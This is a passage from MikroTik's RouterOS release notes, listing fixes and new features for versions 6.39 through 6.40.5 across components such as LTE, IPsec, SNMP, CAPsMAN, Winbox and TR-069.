*) sms - fixed minor problem for SMS delivery;
*) sms - log decoded USSD responses;
*) snmp - fixed "ifHighSpeed" value of VLAN, VRRP and Bonding interfaces;
*) snmp - fixed bridge host requests on devices with multiple bridge interfaces;
*) snmp - fixed bulk requests when non-repeaters are used;
*) snmp - fixed consecutive OID bulk get from the same table;
*) snmp - show only available OIDs under "/system health print oid";
*) ssh - do not use DH group1 with strong-crypto enabled;
*) ssh - enforced 2048bit DH group on tile and x86 architectures;
*) system - show USB topology for the device info;
*) tile - improved hardware encryption processes;
*) tr069-client - fixed "/interface lte apn" configuration parameters;
*) traceroute - improved "/tool traceroute" results processing;
*) upnp - add "src-address" parameter on NAT rule if it is specified on UPnP request;
*) upnp - deny UPnP request if port is already used by the router;
*) ups - fixed duplicate "failed" UPS logs;
*) userman - allow to generate more than 999 users;
*) w60g - added "put-slaves-in-bridge" and "isolate-slaves" options to manage connected clients;
*) w60g - connected stations are treated as separate interfaces;
*) webfig - added favicon file;
*) webfig - fixed router getting reset to default configuration;
*) webfig - fixed terminal graphic user interface under Safari browser;
*) winbox - added "W60G station" tab in Wireless menu;
*) winbox - added "notrack-chain" setting to IPSec peers;
*) winbox - added support for "_" symbol in terminal window;
*) winbox - added switch menu on RB1100AHx4;
*) winbox - do not show MetaROUTER stuff on RB1100AHx4;
*) winbox - do not show duplicate "Switch" menus for CRS326;
*) winbox - do not show duplicate "Template" parameters for filter in IPSec policy list;
*) winbox - do not show duplicate filter parameters "Published" in ARP list;
*) winbox - do not show unnecessary tabs from "Switch" menu;
*) winbox - fixed "/certificate sign" process;
*) winbox - fixed bridge port sorting order by interface name;
*) winbox - show warnings under "/system routerboard settings" menu;
*) wireless - added "allow-signal-out-off-range" option for Access List entries;
*) wireless - added "indonesia3" regulatory domain information;
*) wireless - added passive scan option for wireless scan mode;
*) wireless - added support for CHARGEABLE_USER_ID in EAP Accounting;
*) wireless - check APs against connect-list rules starting with strongest signal;
*) wireless - do not show background scan frequencies in the monitor command channel field;
*) wireless - improved reliability on "rx-rate" selection process;
*) wireless - increased the EAP message retransmit count;
*) wireless - log "signal-strength" when successfully connected to AP;
*) wireless - pass interface MAC address in Sniffer TZSP frames;
*) wireless - updated "UK 5.8 Fixed" and "Australia" country data;
*) wireless - updated "united kingdom" regulatory domain information;

What's new in 6.40.5 (2017-Oct-31 13:05):

*) certificate - fixed import of certificates with empty SKID;
*) crs3xx - fixed 100% CPU usage after interface related changes;
*) firewall - do not NAT address to 0.0.0.0 after reboot if to-address is used but not specified;
*) ike1 - fixed crash after downgrade if DH groups 19,20,21 were used for phase1;
*) ike1 - fixed RSA authentication for Windows clients behind NAT;
*) ipsec - fixed lost value for "remote-certificate" parameter after disable/enable;
*) ipv6 - fixed IPv6 addresses constructed from prefix and static address entry;
*) log - properly recognize MikroTik specific RADIUS attributes;
*) lte - do not reset modem when it is not possible to access SMS storage;
*) lte - fixed modem initialization after reboot;
*) lte - fixed PIN option after setting up the band;
*) sms - include time stamps in SMS delivery reports;
*) sms - properly initialize SMS storage;
*) snmp - fixed "/system license" parameters for CHR;
*) winbox - allow shorten bytes to k,M,G in Hotspot user limits;
*) wireless - fixed rate selection process when "rate-set=configured" and NV2 protocol is used;

What's new in 6.40.4 (2017-Oct-02 08:38):

*) address - show warning on IPv6 address when acquire from pool has failed;
*) arp - properly update dynamic ARP entries after interface related changes;
*) crs1xx/2xx - fixed 1 Gbps forced mode for several SFP modules;
*) crs317 - added L2MTU support;
*) crs3xx - improved packet processing in slowpath;
*) defconf - fixed RouterOS default configuration (introduced in v6.40.3);
*) dhcp - fixed downgrade from RouterOS v6.41 or higher;
*) dhcpv6 client - added IAID check in reply;
*) dhcpv6-client - fixed IA check on solicit when "rapid-commit" is enabled;
*) dhcpv6-client - ignore unknown IA;
*) dhcpv6-client - require pool name to be unique;
*) e-mail - auto complete file name on "file" parameter (introduced in v6.40);
*) export - fixed wireless "ssid" and "supplicant-identity" compact export;
*) hotspot - fixed missing "/ip hotspot server profile" if invalid "dns-name" was specified;
*) hotspot - improved user statistics collection process;
*) ike1 - remove PH1 and PH2 when "mode-config" exchange fails;
*) ipsec - kill PH1 on "mode-config" address failure;
*) ipv6 - fixed IPv6 address request from pool;
*) lte - fixed modem initialization after reboot;
*) ntp-client - properly start NTP client after reboot if manual server IP is not configured;
*) rb931-2nd - fixed startup problems (requires additional reboot after upgrade);
*) routerboard - fixed "/system routerboard upgrade" for CRS212-8G-4S;
*) sfp - fixed OPTON module DDM information readings;
*) sfp - fixed temperature readings for various SFP modules;
*) snmp - fixed "/caps-man registration-table" uptime values;
*) snmp - fixed "/system license" parameters for CHR;
*) tile - improved reliability on MPLS package processing;
*) userman - fixed unresponsive RADIUS server (introduced in v6.40.3);
*) vlan - do not allow VLAN MTU to be higher than L2MTU;
*) webfig - improved reliability of login process;
*) wireless - added "etsi1" regulatory domain information;
*) wireless - improved WPA2 key exchange reliability;
*) wireless - updated "norway" regulatory domain information;

What's new in 6.40.3 (2017-Sep-01 07:40):

*) dhcpv6-server - do not release address of static binding from pool after server removal;
*) export - fixed "/system routerboard" export (introduced in 6.40.1);
*) export - fixed export for PoE-OUT related settings;
*) ike1 - fixed initiator ID comparison to NAT-OA;
*) led - fixed "on" and "off" triggers when multiple LEDs are selected;
*) led - fixed RB711UA ether1 LED (introduced in v6.38rc16);
*) lte - do not show USB LTE modem under "/port" menu;
*) lte - fixed ethernet flap when LTE establishes connection;
*) lte - fixed SXT LTE graphs in QuickSet;
*) lte - improved reliability of USB LTE modems;
*) poe-out - fixed router reboot after "poe-out-status" changes;
*) rb1100ahx4 - fixed HW acceleration fragmented packet decryption when fragment is smaller than 64 bytes;
*) rb750gr3 - show warning and do not allow to use "protected-bootloader" feature if "factory-firmware" older than 3.34.4 version;
*) routerboard - added "mode-button" support for RB750Gr3 (CLI only);
*) ssh - do not execute command if it starts with "-" symbol;
*) traffic-flow - fixed reboots when IPv6 address has been set as target address without active IPv6 package;
*) userman - fixed "limitation" and "profile-limitation" update;
*) userman - fixed CoA packet processing after changes in "/tool user-manager router" configuration;
*) webfig - allow to open table entry even if table is not sorted by # (introduced in v6.40);
*) webfig - allow to unset "rate-limit" for DHCP leases;
*) winbox - added possibility to define "comment" for "/routing bgp network" entries;
*) winbox - do not show FAN related information under "/system health" menu for devices which does not have it;
*) winbox - do not show LCD menu for devices which does not have it;
*) winbox - fixed ARP table update after entry changes state to incomplete;
*) wireless - added "russia3" country settings;
*) wireless - added New Zealand regulatory domain information for P2P links;
*) wireless - updated China and New Zealand regulatory domain information;
*) www - fixed unresponsive Web services (introduced in v6.40);

What's new in 6.40.2 (2017-Aug-08 13:13):

*) dhcpv6-client - fixed IA evaluation order;
*) led - fixed "modem-signal" LEDs (introduced in 6.40);
*) pppoe-client - fixed wrong MRU detection over VLAN interfaces;
*) rb2011 - fixed possible LCD blinking along with ethernet LED (introduced in 6.40);
*) sfp - fixed invalid temperature readings when ambient temperature is below 0C;
*) winbox - added certificate settings;
*) winbox - added support for certificate CRL list;
*) winbox - do not show LCD menu for devices which does not have it;
*) winbox - hide "level" and "tunnel" parameters for IPSec policy templates;
*) winbox - hide FAN speed if it is 0RPM;

What's new in 6.40.1 (2017-Aug-03 12:37):

*) bonding - improved reliability on bonding interface removal;
*) chr - fixed false warnings on upgrade reboots;
*) dhcpv6-client - do not run DHCPv6 client when IPv6 package is disabled;
*) export - fixed export for different parameters where numerical range or constant string is expected;
*) firewall - properly remove "address-list" entry after timeout ends;
*) interface - improved interface state change handling when multiple interfaces are affected at the same time;
*) lte - fixed LTE not passing any traffic while in running state;
*) ovpn-client - fixed incorrect netmask usage for pushed routes (introduced in 6.40);
*) pppoe-client - fixed incorrectly formed PADT packet;
*) rb2011 - fixed possible LCD blinking along with ethernet LED (introduced in 6.40);
*) rb922 - restored missing wireless interface on some boards;
*) torch - fixed Torch on PPP tunnels (introduced in 6.40);
*) trafficgen - fixed "lost-ratio" showing incorrect statistics after multiple sequences;
*) winbox - added "none-dynamic" and "none-static" options for "address-list-timeout" parameter under NAT, Mangle and RAW rules;

What's new in v6.40 (2017-Jul-21 08:45):

!) lte - added initial fastpath support (except SXT LTE and Sierra modems);
!) lte - added initial support for passthrough mode for lte modems that supports fastpath;
!) wireless - added Nv2 AP synchronization feature "nv2-modes" and "nv2-sync-secret" option;
*) bonding - fixed 802.3ad mode on RB1100AHx4;
*) btest - fixed crash when packet size has been changed during test;
*) capsman - added "current-registered-clients" and "current-authorized-clients" count for CAP interfaces;
*) capsman - fixed EAP identity reporting in "registration-table";
*) capsman - set minimal "caps-man-names" and "caps-man-certificate-common-names" length to 1 char;
*) certificate - added "crl-use" setting to disable CRL use (CLI only);
*) certificate - update and reload old certificate with new one if SKID matches;
*) chr - fixed MAC address assignment when hot plugging NIC on XenServer;
*) chr - maximal system disk size now limited to 16GB;
*) conntrack - fixed IPv6 connection tracking enable/disable;
*) console - fixed different command auto complete on ;
*) crs212 - fixed Optech sfp-10G-tx module compatibility with SFP ports;
*) defconf - added IPv6 default firewall configuration (IPv6 package must be enabled on reset);
*) defconf - improved IPv4 default firewall configuration;
*) defconf - renamed 192.168.88.1 address static DNS entry from "router" to "router.lan";
*) dhcp - added "debug" logs on MAC address change;
*) dhcpv4-client - added "gateway-address" script parameter;
*) dhcpv4-server - fixed lease renew for DHCP clients that sends renewal with "ciaddr = 0.0.0.0";
*) dhcpv4-server - fixed server state on interface change in Winbox and Webfig;
*) discovery - fixed timeouts for LLDP neighbours;
*) dns - remove all dynamic cache RRs of same type when adding static entry;
*) dude - fixed server crash;
*) email - added support for multiple attachments;
*) ethernet - fixed occasional broken interface order after reset/first boot;
*) ethernet - fixed rare linking problem with forced 10Mbps full-duplex mode;
*) export - added "terse" option;
*) export - added default "init-delay" setting for "/routerboard settings" menu;
*) export - added router model and serial number to configuration export;
*) export - fixed "/interface list" verbose export;
*) export - fixed "/ipv6 route" compact export;
*) export - fixed MPLS "dynamic-label-range" export;
*) export - fixed SNMP "src-address" for compact export;
*) fastpath - improved performance when packets for slowpath are received;
*) fastpath - improved process of removing dynamic interfaces;
*) fasttrack - fixed fasttrack over interfaces with dynamic MAC address;
*) fetch - added "src-address" parameter for HTTP and HTTPS;
*) filesystem - improved error correcting process on tilera and RB1100AHx4 storage;
*) firewall - added "none-dynamic" and "none-static" options for "address-list-timeout" parameter;
*) firewall - fixed bridge "action=log" rules;
*) firewall - fixed cosmetic "inactive" flag when item was disabled;
*) firewall - fixed crash on fasttrack dummy rule manual change attempt;
*) firewall - removed unique address list name limit;
*) hAP ac lite - removed nonexistent "wlan-led";
*) hotspot - added "address-list" support in "walled-garden" IP section;
*) hotspot - require "dns-name" to contain "." symbol under Hotspot Server Profile configuration;
*) ike1 - added log error message if netmask was not provided by "mode-config" server;
*) ike1 - added support for "framed-pool" RADIUS attribute;
*) ike1 - create tunnel policy when no split net provided;
*) ike1 - fixed minor memory leak on peer configuration change;
*) ike1 - kill phase1 instead of rekey if "mode-config" is used;
*) ike1 - removed SAs on DPD;
*) ike1 - send phase1 delete;
*) ike1 - wait for cfg set reply before ph2 creation with xAuth;
*) ike2 - added RADIUS attributes "Framed-Pool", "Framed-Ip-Address", "Framed-Ip-Netmask";
*) ike2 - added pfkey kernel return checks;
*) ike2 - added support for "Mikrotik_Address_List" RADIUS attribute;
*) ike2 - added support for "mode-config" static address;
*) ike2 - by default use "/24" netmask for peer IP address in split net;
*) ike2 - fixed duplicate policy checking with "0.0.0.0/0" policies;
*) ike2 - prefer traffic selector with "mode-config" address;
*) ipsec - added "firewall=add-notrack" peer option (CLI only);
*) ipsec - added information in console XML for "mode-config" menu;
*) ipsec - added support for "key-id" peer identification type;
*) ipsec - allow to specify chain in "firewall" peer option;
*) ipsec - do not deduct "dst-address" from "sa-dst-address" for "/0" policies;
*) ipsec - enabled modp2048 DH group by default;
*) ipsec - fixed connections cleanup on policy or proposal modification;
*) ipsec - optimized logging under IPSec topic;
*) ipsec - removed policy priority;
*) l2tp - fixed handling of pre-authenticated L2TP sessions with CHAP authentication;
*) l2tp-server - added "one-session-per-host" option;
*) log - added "poe-out" topic;
*) log - improved "l2tp" logs;
*) log - optimized "wireless,info" topic logs;
*) log - work on false CPU/RAM overclocked alarms;
*) lte - added "accounting" logs for LTE connections;
*) lte - added additional driver support for DWR-910;
*) lte - added info command support for the Jaton LTE modem;
*) lte - added initial support for "NTT DoCoMo" modem;
*) lte - added support for Huawei E3531-6;
*) lte - added support for ZTE TE W120;
*) lte - fixed info command when it is executed at the same time as modem restarts/disconnects;
*) lte - improved SMS delivery report;
*) lte - improved reliability on SXT LTE;
*) metarouter - fixed display of bogus error message on startup;
*) mmips - added support for NVME disks;
*) ovpn - added support for "push-continuation";
*) ovpn - added support for topology subnet for IP mode;
*) ovpn - fixed duplicate default gateway presence when receiving extra routes;
*) ovpn - improved performance when receiving too many options;
*) packages - increased automatic download retry interval to 5 minutes if there is no free disk space;
*) ping - fixed ping getting stuck (after several thousands of ping attempts);
*) ppp - added initial support for ZTE K4203-Z and ME3630-E;
*) ppp - added output values for "info" command for finding the GSM base station's location ("LAC" and "IMSI");
*) ppp - fixed "user-command" output;
*) ppp - fixed non-standart PAP or CHAP packet handling;
*) ppp - improved MLPPP packet forwarding performance;
*) ppp - use interface name instead of IP as default route gateway;
*) proxy - fixed potential crash;
*) proxy - fixed rare program crash after closing client connection;
*) quickset - added "Band" setting to "CPE" and "PTP CPE" modes;
*) quickset - added special firewall exception rules for IPSec;
*) quickset - fixed incorrect VPN address value on arm and tilera;
*) quickset - simplified LTE status monitoring;
*) quickset - use active user name and permissions when applying changes;
*) rb1100ahx4 - fixed startup problems (requires additional reboot after upgrade);
*) rb3011 - fixed packet passthrough on switch2 while booting;
*) rb750gr3 - fixed USB power;
*) routerboard - added "caps-mode" option for "reset-configuration";
*) routerboard - added "caps-mode-script" for default-configuration print;
*) routing - allow to disable "all" interface entry in BFD;
*) safe-mode - fixed session handling when Safe Mode is used on multiple sessions at the same time;
*) sfp - fixed invalid temperature reporting when ambient temperature is less than 0;
*) sms - decode reports in readable format;
*) sniffer - do not skip L2 packets when "all" interface mode was used;
*) snmp - added "ifindex" on interface traps;
*) snmp - added CAPsMAN interface statistics;
*) snmp - added ability to set "src-address";
*) snmp - fixed "/system resource cpu print oid" menu;
*) snmp - fixed crash on interface table get;
*) snmp - fixed wireless interface walk table id ordering;
*) socks - fixed crash while processing many simultaneous sessions;
*) ssl - added Wildcard support for "left-most" DNS label (will allow to use signed Wildcard certificate on VPN servers);
*) supout - fixed IPv6 firewall section;
*) switch - fixed "loop-protect" on CRS SFP/SFP+ ports;
*) switch - fixed multicast forwarding on CRS326;
*) tile - fixed copying large amount of text over serial console;
*) tr069-client - fixed lost HTTP header on authorization;
*) trafficgen - added "lost-ratio" to statistics;
*) ups - show correct "line-voltage" value for usbhid UPS devices;
*) userman - added "/tool user-manager user clear-profiles" command;
*) userman - do not send disconnect request for user when "simultaneous session limit reached";
*) userman - lookup language files also in "/flash" directory;
*) vlan - do not delete existing VLAN interface on "failure: already have such vlan";
*) webfig - fixed wireless "scan-list" parameter not being saved after applying changes;
*) winbox - added "eap-identity" to CAPsMAN registration table;
*) winbox - added "no-dad" setting to IPv6 addresses;
*) winbox - added "reselect-channel" to CAPsMAN interfaces;
*) winbox - added "session-uptime" to LTE interface;
*) winbox - added TR069 support;
*) winbox - do not autoscale graphs outside known maximums;
*) winbox - fixed wireless interface "amsdu-threshold" max limit;
*) winbox - hide LCD menu on CRS112-8G-4S;
*) winbox - make IPSec policies table an order list;
*) winbox - moved LTE info fields to status tab;
*) winbox - show "/interface wireless cap print" warnings;
*) winbox - show "/system health" only on boards that have health monitoring;
*) winbox - show "D" flag under "/interface mesh port" menu;
*) wireless - NAK any methods except MS-CHAPv2 as inner method in PEAP;
*) wireless - added option to change "nv2-downlink-ratio" for nv2 protocol;
*) wireless - added option to set "fixed-downlink" mode for nv2 protocol;
*) wireless - allow VirutalAP on Level0 (24h demo) license;
*) wireless - always use "multicast-helper" when DHCP is being used;
*) wireless - do not skip >2462 channels if interface is WDS slave;
*) wireless - fixed 802.11u wireless request processing;
*) wireless - fixed EAP PEAP success processing;
*) wireless - fixed compatibility with "AR5212" wireless chips;
*) wireless - fixed rare crash on cap disable;
*) wireless - fixed registration table "signal-strength" reporting for chains when using nv2;

What's new in 6.39.2 (2017-Jun-6 08:01):

*) 6to4 - fixed wrong IPv6 "link-local" address generation;
*) arp - fixed "make-static";
*) bonding - do not add bonding interface if "could not set MTU" error is received;
*) bridge - fixed connectivity between bridges when "fast-forward" feature is enabled;
*) conntrack - load IPv6 connection tracking independently from IPv4;
*) console - fixed "No such file or directory" warnings on upgrade reboots;
*) export - removed spare "caller-id-type" value from compact export;
*) fetch - fixed "user" and "password" argument parsing from URL for FTP;
*) firewall - fixed "address-list" entry "creation-time" adjustment to timezone;
*) firewall - do not allow to set "rate" value to 0 for "limit" parameter;
*) firewall - fixed "address-list" entry changing from IP to DNS and vice versa;
*) gps - removed duplicate logs;
*) ike1 - fixed crash on xauth message;
*) ike1 - removed xauth login length limitation;
*) ike2 - fixed rare kernel failure on address acquire;
*) ike2 - fixed situation when traffic selector prefix was parsed incorrectly;
*) ipsec - fixed generated policy priority;
*) ipsec - fixed peer "my-id" address reset;
*) ipsec - renamed "remote-dynamic-address" to "dynamic-address";
*) ipv6 - fixed address becoming invalid when interface was removed from bridge/mesh;
*) led - fixed turning off LED when interface is lost;
*) lte - improved info channel background polling;
*) lte - improved relialibility on SXT LTE;
*) lte - replaced "user-command" with "at-chat" command;
*) ppp - fixed "change-mss" functionality (introduced in 6.39);
*) ppp - fixed MLPPP over multiple channels/interfaces (introduced in v6.39);
*) ppp - send correct IP address in RADIUS "accounting-stop" messages (introduced in 6.39);
*) pppoe - fixed warning on PPPoE server, when changing interface to non-slave interface;
*) pppoe-client - removed false warning from client interface if it starts running on non-slave interface;
*) pppoe-server - fixed "one-session-per-host" issue where 2 simultaneous sessions were possible from the same host;
*) queue - fixed queuing when at least one child queue has "default-small" and other/s is/are different (introduced in 6.35);
*) quickset - fixed LTE "signal-strength" graphs;
*) sniffer - fixed VLAN tags when sniffing all interfaces;
*) snmp - fixed limited walk;
*) switch - fixed disabling of MAC learning on CRS1xx/CRS2xx;
*) tile - fixed EoIP keepalive when tunnel is made over VLAN interface;
*) tile - fixed rare encryption kernel failure when small packets are processed;
*) traffic-flow - fixed IPFIX IPv6 data reporting;
*) winbox - do not allow to open multiple same sub-menus at the same time;
*) winbox - fixed firewall port selection with Winbox v2;
*) winbox - fixed LTE info button;
*) winbox - removed spare values from "loop-protect" setting for EoIPv6 tunnels;
*) wireless - reduced load on CPU for high speed wireless links;

What's new in 6.39.1 (2017-Apr-27 10:06):

*) defconf - discard default configuration startup query with RouterOS upgrade;
*) defconf - discard default configuration startup query with configuration change from Webfig;
*) smb - fixed external drive folder sharing when "/flash" folder existed;
*) smb - fixed invalid default share after reboot when "/flash" folder existed;
*) upnp - fixed firewall nat rule update when external IP address changes;
*) dns - made loading thousands of static entries faster;

What's new in 6.39 (2017-Apr-27 10:06):

!) bridge - added "fast-forward" setting and counters (enabled by default only for new bridges) (CLI only);
!) bridge - added support for special and faster case of fastpath called "fast-forward" (available only on bridges with 2 interfaces);
!) bridge - reverted bridge BPDU processing back to pre-v6.38 behaviour; (v6.40 will have another separate VLAN-aware bridge implementation);
!) filesystem - fixed rare situation when filesystem failed to read all configuration on startup;
!) filesystem - fixed rare situation when filesystem went into read-only mode (some configuration might have gotten lost on reboot);
!) firewall - discontinued support for p2p matcher (old rules will become invalid);
!) kernel - fixed UDP checksum handling in rare oveflow situations;
!) l2tp - added fastpath support when MRRU is enabled;
!) ppp - completely rewritten internal fragmentation algorithm (when MRRU is used), optimized for multicore;
!) ppp - implemented internal algorithm for "change-mss", no mangle rules necessary;
!) pppoe - added fastpath support when MRRU and MLPPP are enabled;
!) quickset - configuration changes are now applied only on "OK" and "Apply" (not on mode change);
!) tile - fixed IPSec hardware acceleration out-of-order packet problem, significantly improved performance;
!) winbox - minimal required version is v3.11;
*) address - fixed crash when address is assigned to another bridge port;
*) api - fixed double dynamic flags for "/ip firewall address-list print";
*) capsman - added "extension-channel" XX and XXXX auto matching modes;
*) capsman - added "keepalive-frames" setting;
*) capsman - added "skip-dfs-channels" setting;
*) capsman - added CAP discovery interface list support;
*) capsman - added DFS support;
*) capsman - added EAP identity to registration table;
*) capsman - added ability to specify multiple channels in frequency field;
*) capsman - added save-channel option to speed up frequency selection on CAPsMAN restart;
*) capsman - added support for "background-scan" and channel "reselect-interval";
*) capsman - added support for static virtual interfaces on CAP;
*) capsman - changed channel "width" name to "control-channel-width" and changed default values;
*) capsman - improved CAP status querying;
*) capsman - improved support for communicating frame priority between CAP and CAPsMAN;
*) certificate - SCEP client now supports FQDN URL and port;
*) certificate - allow CRL address to be specified as DNS name;
*) console - fixed "/ip neighbor discovery" export;
*) console - fixed DHCP/PPP add-default-route distance minimal value to 1;
*) console - fixed crash;
*) console - fixed incorrect ":put [/lcd get enabled]" value;
*) ddns - improved "dns-update" authentication validation;
*) defconf - fixed Groove 52 ac band settings;
*) defconf - fixed default configuration generation when wireless package is disabled;
*) dhcp-client - added "script" option which executes script on state changes;
*) dhcpv4 - fixed string option parser;
*) dhcpv4-server - added "lease-hostname" script parameter;
*) dhcpv4-server - by default make server authoritative;
*) dhcpv4-server - do some lease checks only on enabled object;
*) discovery - fixed LLDP discovery, IPv6 address was not parsed correctly;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=21&t=116471);
*) email - check for errors during SMTP exchange process;
*) ethernet - added "voltage-too-low" status for single port power injector devices;
*) ethernet - fixed "loop-protect" on "master-port";
*) ethernet - fixed rare switch chip hang (could cause port flapping);
*) ethernet - fixed unnecessary power cycle of powered device when changing any poe-out related setting on single port power injector devices;
*) ethernet - renamed "rx-lose" to "rx-loss" in ethernet statistics;
*) ethernet - reversed poe-priority on hEX PoE and OmniTIK 5 PoE to make "poe-priority" consistent to all other RouterOS priorities;
*) fastpath - fixed rare crash on devices with dynamic interfaces;
*) fetch - added "http-data" and "http-method" parameters to allow delete, get, post, put methods (content-type=application/x-www-form-urlencoded by default);
*) fetch - fixed authentication failure;
*) fetch - fixed download issue over HTTPS;
*) gps - added "fix-quality" and "horizontal-dilution" parameters;
*) graphing - fixed graph disappearance after power outage;
*) hotspot - added access to HTTP headers using $(http-header-name);
*) ike1 - fixed ph2 ID logging;
*) ike2 - allow multiple child SA traffic selectors on re-key;
*) ike2 - always replace empty TSi with configured address if it is available;
*) ike2 - check child state before allowing rekey;
*) ike2 - default to /32 peer address mask;
*) ike2 - fixed CTR mode;
*) ike2 - fixed EAP message length;
*) ike2 - fixed ISA handler object removal on SA delete;
*) ike2 - fixed RSA authentication without EAP;
*) ike2 - fixed ctr mode;
*) ike2 - fixed disabled DPD;
*) ike2 - fixed last EAP auth payload type;
*) ike2 - fixed ph2 state when sending notify;
*) ike2 - fixed policy release during SA negotion;
*) ike2 - fixed state when sending delete packet;
*) ike2 - improved logging;
*) ike2 - kill only child SAs which are not re-keyed by remote peer;
*) ike2 - log RADIUS timeout message under error topic;
*) ike2 - remove old SA after rekey;
*) ike2 - send EAP identity as user-name RADIUS attribute;
*) ike2 - update "calling_station_id" RADIUS attribute;
*) ike2 - update peer identity after successful EAP authentication;
*) ippool - return proper error message when trying to create duplicate name;
*) ipsec - added "last-seen" parameter to active connection list;
*) ipsec - allow mixing aead algorithms in proposal;
*) ipsec - better responder flag calculator for console;
*) ipsec - disallow AH+ESP combined policies ;
*) ipsec - do not loose "use-ipsec=yes" parameter after downgrade;
*) ipsec - enable aes-ni on i386 and x64 for cbc, ctr and gcm modes;
*) ipsec - fixed "/ip ipsec policy group export verbose";
*) ipsec - fixed "mode-cfg" verbose export;
*) ipsec - fixed SA authentication flag;
*) ipsec - renamed "hw-authenc" flag to "hw-aead";
*) ipsec - show hardware accelerated authenticated SAs;
*) ipsec - updated tilera classifier for UDP encapsulated ESP;
*) l2tp - added support for multiple L2TP tunnels (not to be confused with sessions) between same endpoints (required in some LNS configurations);
*) l2tp - fixed hidden attribute decryption in forwarded CHAP responses for LNS;
*) l2tp-server - added "caller-id-type" to forward calling station number to RADIUS on authentication;
*) l2tp-server - added "use-ipsec=required" option;
*) l2tp-server - fixed upgrade to keep "use-ipsec=yes" in L2TP server;
*) leds - added LTE modem access technology trigger;
*) leds - changed error message on unsupported board;
*) leds - do not update single LED state when it is not changed;
*) leds - show warning on print when "modem-signal-threshold" is not available;
*) log - added "gps" topic;
*) log - added "tr069" topic;
*) log - added missing "license limit exceeded" log entry;
*) log - added warning when Winbox/Dude sessions were denied;
*) log - do not show changes in packet if NAT has not been used;
*) log - make SNMP logs more compact;
*) lte - added "session-uptime" in info command;
*) lte - added LTE signal level reading for Cinterion modems;
*) lte - added error handling for remote AT execute;
*) lte - added initial support for DWR-910 modem;
*) lte - added initial support for Quectel ec25;
*) lte - added initialization for Cinterion;
*) lte - added log entry for SMS delivery report;
*) lte - added support for Vodafone R216 (Huawei);
*) lte - buffer AT events while info command is active;
*) lte - fixed "/interface lte info X once";
*) lte - fixed IPv6 address prefix on interface
*) lte - fixed network mode selection for me909u, mu609;
*) lte - fixed older standard CEREG parsing;
*) lte - fixed support for Huawai R216;
*) lte - fixed user-command;
*) lte - reset interface stats on "link-down";
*) netinstall - fixed typos;
*) ntp - restart NTP client when it is stuck in error state;
*) ppp - added "bridge-horizon" option under PPP/Profile;
*) ppp - added option to specify "interface-list" in PPP/Profile;
*) ppp - fixed rare kernel failure on PPP client connection;
*) ppp - fixed rare kernel failure when receiving IPv6 address on PPP interface;
*) ppp - include rates, limits and address-lists parameters in RADIUS accounting requests;
*) ppp-client - added support for Datacard 750UL, DWR-730 and K4607-Zr;
*) pppoe - added warning on PPPoE client/server, if it is configured on slave interface;
*) pppoe - set default keepalive 10s for newly created PPPoE clients;
*) quickset - added initial LTE AP mode support;
*) rb1100ahx2 - fixed random counter resets for ether12,13;
*) rb3011 - added partitioning support;
*) smb - fixed different memory leaks and crashes;
*) smb - fixed share path on devices with "/flash" directory;
*) smips - reduced RouterOS main package size;
*) snmp - "No Such Instance" error message is replaced with "No Such Object";
*) snmp - added fan-speed OIDs in "/system health print oid";
*) snmp - added optical table;
*) snmp - fixed rare crash;
*) snmp - improved getall filter;
*) snmp - improved response speed when multiple requests are received within short period of time;
*) snmp - increase "engineBoots" value on reboot;
*) snmp - optimized bridge table processing;
*) tile - added initial support for NVMe SSD disk drives;
*) tile - fixed IPSec crash (introduced in 6.39rc64);
*) tile - optimized hardware encryption;
*) tr069-client - added "Device.Hosts.Host.{i}." support;
*) tr069-client - added "Device.WiFi.NeighboringWiFiDiagnostic." support;
*) tr069-client - added "Ethernet.Interface.{i}.MACAddress" parameter;
*) tr069-client - added DHCP server support;
*) tr069-client - added Upload RPC "2 Vendor Log File" support;
*) tr069-client - added architecture name parameter (X_MIKROTIK_ArchName - vendor specific);
*) tr069-client - added basic stats parameters for some interface types;
*) tr069-client - added basic support for "/ip firewall filters";
*) tr069-client - added connection request authentication;
*) tr069-client - added firewall NAT support using vendor Parameters;
*) tr069-client - added parameters for DNS client management support;
*) tr069-client - added ping diagnostics support;
*) tr069-client - added support for escaped entity references (& < > ' ");
*) tr069-client - added support for managing "/system/identity/" value;
*) tr069-client - added support for memory and CPU load parameters;
*) tr069-client - added support for uploading/downloading factory script;
*) tr069-client - added traceroute diagnostics support;
*) tr069-client - close connection if CPE considers XML as invalid;
*) tr069-client - fixed "AddObjectResponse" "InstanceNumber" value;
*) tr069-client - fixed "Device.ManagementServer." value update;
*) tr069-client - fixed XML special character parsing;
*) tr069-client - fixed crash on =acs-url change special case;
*) tr069-client - fixed special escape characters on XML data send;
*) tr069-client - fixed write for "Device.ManagementServer.URL";
*) tr069-client - general improvements on reducing storage space;
*) tr069-client - generate random connection request target path;
*) tr069-client - hide "Device.PPP.Interface.{i}.Password" value;
*) tr069-client - improved LTE monitoring process;
*) tr069-client - increased performance on GetParameterValues;
*) tr069-client - made any Download RPC overwrite configuration except ".alter";
*) tr069-client - make more Parameters deny active notifications;
*) tr069-client - set CHR license ID as ".SerialNumber" value to avoid "no serial number" error in ACS;
*) traceroute - small fix;
*) tunnels - fixed reboot loop on configurations with IPIP and EoIP tunnels (introduced in 6.39rc68);
*) usb - added support for more CP210X devices;
*) userman - allow "name-for-user" to be empty and not unique;
*) userman - automatically select all newly created users to generate vouchers;
*) userman - fixed rare crash when User Manager requested file does not exist on router;
*) userman - fixed rare web interface crash while using Users section;
*) wAP ac - improved 2.4GHz wireless performance;
*) webfig - added menu bar to quickly select between Webfig, Quickset and Terminal;
*) webfig - allow shorten bytes to k,M,G in firewall "connection-bytes" and "connection-rates";
*) webfig - allow to change global variable contents;
*) webfig - allow to enter frequency ranges in wireless scan list;
*) webfig - allow to select "default-encryption" profile on PPP tunnels;
*) webfig - correctly specify routing filter prefix;
*) webfig - do not allow to reorder items if table is sorted by some column;
*) webfig - fixed bridge property display;
*) webfig - fixed delays on key press in terminal;
*) webfig - fixed tab ordering on Google Chrome;
*) webfig - fixed last-link-up & last-link-down time information;
*) webfig - improved field layout;
*) webfig - make Terminal window work within Webfig window;
*) webfig - show all available options under Advanced Mode for wireless interfaces;
*) webfig - show proper error messages for optional erroneous text fields;
*) winbox - added "Flush" button under unicast-fdb menu;
*) winbox - added "group-key-update" to CAPsMAN security settings;
*) winbox - added "k" and "M" unit support to PPP secret limit-bytes parameters;
*) winbox - added "memory-scroll", "filter-cpu", "filter-ipv6-address", "filter-operation-between-entries" parameters;
*) winbox - added "save-selected" setting under CAPsMAN channels;
